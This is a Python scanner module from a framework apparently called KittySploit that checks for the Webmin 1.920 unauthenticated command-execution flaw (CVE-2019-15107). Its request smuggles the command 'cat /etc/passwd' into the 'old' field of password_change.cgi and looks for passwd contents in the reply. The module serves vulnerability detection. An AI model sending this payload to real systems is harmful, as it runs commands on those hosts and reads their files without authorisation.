#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Webmin <=1."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Webmin <= 1.920 - Unauthenticated Remote Command Execution Detection',
        'description': "Webmin <=1.920. is vulnerable to an unauthenticated remote command execution via the parameter 'old' in password_change.cgi.",
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2019', 'packetstorm', 'webmin', 'rce', 'kev', 'edb', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://pentest.com.tr/exploits/DEFCON-Webmin-1920-Unauthenticated-Remote-Command-Execution.html',
            'https://nvd.nist.gov/vuln/detail/CVE-2019-15107',
            'https://www.exploit-db.com/exploits/47230',
            'http://www.pentest.com.tr/exploits/DEFCON-Webmin-1920-Unauthenticated-Remote-Command-Execution.html',
            'http://packetstormsecurity.com/files/154485/Webmin-1.920-Remote-Code-Execution.html',
        ],
        'cve': 'CVE-2019-15107',
    }

    def run(self):
        path = '/password_change.cgi'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Referer': '{{BaseURL}}', 'Content-Type': 'application/x-www-form-urlencoded'}, data='user=rootxx&pam=&old=test|cat /etc/passwd&new1=test2&new2=test2&expired=2\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if any(re.search(rx, body) for rx in body_regexes):
            self.set_info(severity='critical', reason='Webmin <= 1.920 - Unauthenticated Remote Command Execution detected', path=path)
            return True
        return False

